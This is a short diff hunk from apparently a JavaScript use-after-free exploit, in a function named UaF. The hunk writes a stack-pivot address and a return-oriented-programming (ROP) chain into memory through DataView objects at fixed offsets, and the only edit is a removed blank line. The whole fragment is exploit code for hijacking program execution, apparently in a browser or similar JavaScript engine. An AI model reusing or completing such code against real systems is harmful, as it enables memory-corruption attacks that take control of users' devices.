@@ -33,7 +33,6 @@ function UaF(a){
         ar[i].setUint32(0x2BC, pivotAdress);
         ar[i].setUint32(0x208, pivotAdressAdress+0x300);
         var ropCurrentOffset = 0x304;
-
         realROPChain.forEach(function(element) {
             ar[i].setUint32(ropCurrentOffset, element);
             ropCurrentOffset += 4;
